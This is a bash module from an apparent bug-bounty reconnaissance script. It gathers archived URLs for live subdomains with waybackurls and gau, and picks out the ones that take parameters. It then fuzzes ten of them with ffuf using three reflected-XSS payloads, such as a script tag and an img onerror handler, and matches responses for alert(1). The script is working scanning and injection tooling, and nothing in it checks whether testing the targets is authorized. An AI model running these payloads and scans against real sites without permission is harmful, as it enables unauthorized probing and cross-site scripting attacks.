#!/bin/bash
# ══════════════════════════════════════════════════════
#  MOD 11: Deep Fuzzing & Wayback Recon
# ══════════════════════════════════════════════════════

mod_deep_fuzzing() {
  log_section "MOD 11: Deep Fuzzing & Archive Recon"
  local F="$OUTPUT_DIR/fuzzing"
  mkdir -p "$F"
  
  local LIVE="$OUTPUT_DIR/subdomains/live.txt"
  [[ ! -f "$LIVE" ]] && return
  
  log_info "Fetching historical URLs using waybackurls and gau..."
  
  # waybackurls
  if cmd_exists waybackurls; then
    cat "$LIVE" | waybackurls 2>/dev/null > "$F/wayback.txt"
  else
    log_warn "waybackurls not found. Install: go install github.com/tomnomnom/waybackurls@latest"
  fi
  
  # gau
  if cmd_exists gau; then
    cat "$LIVE" | gau --threads "$THREADS" 2>/dev/null > "$F/gau.txt"
  else
    log_warn "gau not found. Install: go install github.com/lc/gau/v2/cmd/gau@latest"
  fi
  
  # Merge and filter
  cat "$F/wayback.txt" "$F/gau.txt" 2>/dev/null | sort -u | \
    grep -ivE "\.(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|svg)$" > "$F/all_archive_urls.txt"
    
  local URL_COUNT=$(wc -l < "$F/all_archive_urls.txt" 2>/dev/null || echo 0)
  log_info "Found $URL_COUNT historical URLs."
  
  # Extract URLs with parameters for fuzzing
  grep "=" "$F/all_archive_urls.txt" | sort -u > "$F/param_urls.txt"
  local PARAM_COUNT=$(wc -l < "$F/param_urls.txt" 2>/dev/null || echo 0)
  log_info "Found $PARAM_COUNT URLs with parameters."
  
  # Basic XSS fuzzing with ffuf if available
  if cmd_exists ffuf && [[ -f "$F/param_urls.txt" ]] && [[ "$PARAM_COUNT" -gt 0 ]]; then
    log_info "Fuzzing a small sample of parameterized URLs..."
    
    # Create a small XSS payload list
    local PAYLOADS="/tmp/bh_xss_payloads.txt"
    cat << 'EOF' > "$PAYLOADS"
"><script>alert(1)</script>
"><img src=x onerror=alert(1)>
' autofocus onfocus=alert(1)//
EOF

    # Take top 10 URLs and replace parameter values with FUZZ
    head -10 "$F/param_urls.txt" | sed 's/=\([^&]*\)/=FUZZ/g' > "$F/fuzz_targets.txt"
    
    while read -r target; do
      log_info "Fuzzing: $target"
      safe_run ffuf -w "$PAYLOADS" -u "$target" -mr "alert\(1\)" -s -t "$THREADS" >> "$F/xss_fuzz_results.txt" || true
    done < "$F/fuzz_targets.txt"
    
    log_info "Fuzzing complete. Results in $F/xss_fuzz_results.txt"
  fi
}
